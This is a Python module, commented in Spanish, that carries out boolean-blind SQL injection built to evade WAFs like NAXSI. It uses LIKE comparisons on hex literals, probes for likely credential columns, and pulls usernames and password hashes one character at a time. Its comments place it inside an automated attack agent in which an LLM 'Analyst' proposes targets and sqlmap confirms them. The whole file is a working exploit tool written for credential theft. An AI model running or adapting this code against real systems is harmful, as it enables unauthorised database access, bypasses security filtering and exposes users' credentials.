"""Extracción boolean-blind para WAFs que bloquean UNION pero dejan pasar booleanos (p. ej. NAXSI).

Extrae un valor carácter por carácter preguntando sí/no con LIKE sobre literales hex (sin comillas,
sin SELECT/substring que el WAF puntúa). El agente lo usa cuando UNION está bloqueado pero el
booleano `AND 1=1` funciona. Es la técnica "score-reducing" con la que se vence a NAXSI.

Habla con el exterior por un `oracle(payload) -> bool` que devuelve True si la condición inyectada
es verdadera (el objetivo devuelve fila)."""
from __future__ import annotations

from typing import Callable, Optional, Sequence

_HEX = "0123456789abcdef"
_PRINTABLE = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$^&*()-_+=.,:@/ "
# Respaldo MÍNIMO de emergencia, solo si no llegan candidatos de fuera (p. ej. LLM caído y sin
# dataset). En operación normal los candidatos los propone el Analyst (LLM) y los aterriza sqlmap.
_USER_COLS = ("user", "username", "login", "name", "email", "uname", "account")
_PASS_COLS = ("password", "pass", "pwd", "passwd", "secret", "hash", "token")

Oracle = Callable[[str], bool]


class BlindExtractor:
    def __init__(self, oracle: Oracle, quote: str = "", say: Optional[Callable[[str], None]] = None,
                 user_cols: Optional[Sequence[str]] = None,
                 pass_cols: Optional[Sequence[str]] = None,
                 like: Optional[str] = None):
        self.oracle = oracle
        self.q = quote
        self.say = say or (lambda _m: None)
        self.requests = 0
        # Candidatos de nombre de columna (del Analyst/sqlmap); respaldo mínimo si no llegan.
        self.user_cols = tuple(user_cols) if user_cols else _USER_COLS
        self.pass_cols = tuple(pass_cols) if pass_cols else _PASS_COLS
        # Forma de comparación (la GENERA el Executor; evade el WAF con LIKE+hex). Respaldo: la básica.
        self.like = like or "{col} LIKE {hex}"

    def _cond(self, condition: str) -> bool:
        """Envía `1{q} AND <condition>-- -` y devuelve si fue verdadera (hubo fila)."""
        self.requests += 1
        return self.oracle(f"1{self.q} AND {condition}-- -")

    def confirm(self) -> bool:
        """Inyección booleana: 1=1 (fila) distinto de 1=2 (sin fila)."""
        return self._cond("1=1") and not self._cond("1=2")

    def column_exists(self, col: str) -> bool:
        # `col LIKE 0x25` (0x25 = '%') devuelve fila si la columna existe; si no, error -> sin fila
        return self._cond(self.like.format(col=col, hex="0x25"))

    def find_column(self, candidates) -> str:
        for c in candidates:
            if self.column_exists(c):
                return c
        return ""

    def extract(self, col: str, charset: str = _HEX, max_len: int = 64) -> str:
        """Reconstruye el valor de `col` carácter por carácter con LIKE 'prefijo%'."""
        value = ""
        while len(value) < max_len:
            found = None
            for ch in charset:
                like_hex = "0x" + (value + ch).encode("utf-8").hex() + "25"  # LIKE 'value+ch%'
                if self._cond(self.like.format(col=col, hex=like_hex)):
                    found = ch
                    break
            if found is None:
                break  # no hay más caracteres -> fin del valor
            value += found
            self.say(f"[Blind] {col}: {value}")
        return value

    def dump_first_row(self) -> Optional[dict]:
        """Descubre columnas de credenciales (probando nombres comunes con LIKE) y extrae la 1ª fila."""
        if not self.confirm():
            return None
        # Los candidatos los propuso el Analyst (LLM) y los aterrizó sqlmap; aquí solo se confirma
        # cuál existe, sondeando `col LIKE 0x25` por cada nombre.
        user_col = self.find_column(self.user_cols)
        pass_col = self.find_column(self.pass_cols)
        self.say(f"[Blind] columnas halladas: usuario={user_col!r} password={pass_col!r}")
        if not pass_col:
            return None
        username = self.extract(user_col, charset=_PRINTABLE) if user_col else ""
        password = self.extract(pass_col, charset=_HEX) or self.extract(pass_col, charset=_PRINTABLE)
        return {"username": username, "hash": password}
